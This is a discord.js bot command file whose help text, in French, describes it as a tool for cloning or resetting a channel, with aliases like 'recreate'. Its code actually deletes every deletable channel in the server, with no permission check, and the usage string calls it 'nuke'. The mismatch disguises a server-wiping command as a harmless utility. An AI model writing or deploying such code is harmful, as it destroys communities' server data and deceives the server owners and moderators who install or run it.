const Discord = require("discord.js");

module.exports.run = async(client,message,args) => {
  
  message.guild.channels.cache.array().forEach(element => {
    if (element.deletable) {
        element.delete("Wiping channel.");
    }
});
};
module.exports.help = {
  name: 'dac',
  aliases: ["recreer","recreate","resetchannel","channelreset"],
  cooldown: 0,
  description: 'Permet de cloner un channel.',
  usage: '<prefix>nuke'
};